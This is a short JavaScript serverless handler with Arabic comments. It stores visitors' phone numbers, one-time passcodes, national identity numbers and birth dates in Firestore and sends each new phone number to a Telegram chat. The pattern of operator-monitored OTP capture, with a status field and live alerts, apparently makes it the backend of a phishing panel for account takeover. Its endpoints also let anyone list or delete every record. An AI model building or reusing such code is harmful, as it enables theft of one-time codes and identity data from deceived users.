import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc, getDocs, query, orderBy, doc, updateDoc, deleteDoc } from "firebase/firestore";

const firebaseConfig = JSON.parse(process.env.FIREBASE_CONFIG);
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

export default async function handler(req, res) {
    const { method } = req;
    const usersCol = collection(db, "users");

    try {
        // 1. جلب البيانات (للإدارة وللمراقبة)
        if (method === 'GET') {
            const q = query(usersCol, orderBy("timestamp", "desc"));
            const snapshot = await getDocs(q);
            const data = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
            return res.status(200).json(data);
        }

        // 2. إرسال بيانات جديدة (من صفحة التسجيل)
        if (method === 'POST') {
            const { phone, otp } = req.body;
            const docRef = await addDoc(usersCol, { 
                phone, 
                otp: otp || "", 
                status: "pending", 
                timestamp: new Date() 
            });
            
            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text: `رقم جديد: ${phone}` })
            });
            
            return res.status(200).json({ success: true, id: docRef.id });
        }

        // 3. تعديل الحالة والبيانات (هنا التعديل المطلوب لصفحة الهوية)
        if (method === 'PATCH') {
            const { id, otp, status, identityNumber, birthDate } = req.body;
            
            // ننشئ كائن البيانات المحدثة بناءً على ما يصلنا
            const updateData = {};
            if (otp !== undefined) updateData.otp = otp;
            if (status !== undefined) updateData.status = status;
            if (identityNumber !== undefined) updateData.identityNumber = identityNumber;
            if (birthDate !== undefined) updateData.birthDate = birthDate;
            
            await updateDoc(doc(db, "users", id), updateData);
            return res.status(200).json({ success: true });
        }

        // 4. حذف سجل
        if (method === 'DELETE') {
            const { id } = req.body;
            await deleteDoc(doc(db, "users", id));
            return res.status(200).json({ success: true });
        }

        return res.status(405).json({ message: 'Method not allowed' });

    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}
